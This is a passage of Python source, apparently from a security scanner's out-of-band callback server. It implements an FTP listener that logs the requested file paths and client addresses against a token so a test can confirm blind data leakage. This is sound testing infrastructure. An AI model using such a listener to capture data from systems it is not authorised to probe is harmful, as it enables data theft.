                        finally:
                            pasv_sock.close()
                            pasv_sock = None
                    conn.sendall(b"226 Transfer complete\r\n")
                elif cmd in ("QUIT", "BYE"):
                    conn.sendall(b"221 Bye\r\n")
                    done = True
                    break
                elif cmd:
                    conn.sendall(b"502 Not implemented\r\n")
        if not token:
            return
        hit = {
            "method": "FTP", "path": "/" + token, "query": {},
            "headers": {}, "body": "\n".join(retr_paths),
            "src": src_addr[0], "ts": time.time(), "proto": "FTP",
        }
        ev = None
        with _OOB_LOCK:
            _OOB_HITS.setdefault(token, []).append(hit)
            _OOB_DIRTY = True
            ev = _OOB_EVENTS.get(token)
        _oob_log_hit(token, hit)
        if ev is not None:
            ev.set()
    except Exception:
        pass
    finally:
        try:
            if pasv_sock:
                pasv_sock.close()
        except Exception:
            pass
        try:
            conn.close()
        except Exception:
            pass

def _oob_ftp_accept(srv: socket.socket) -> None:
    while True:
        try:
            conn, addr = srv.accept()
            _OOB_FTP_POOL.submit(_oob_ftp_conn, conn, addr)
        except Exception:
            break

def oob_ftp_start() -> int:
    global _OOB_FTP_PORT, _OOB_FTP_SOCK, _OOB_FTP_POOL
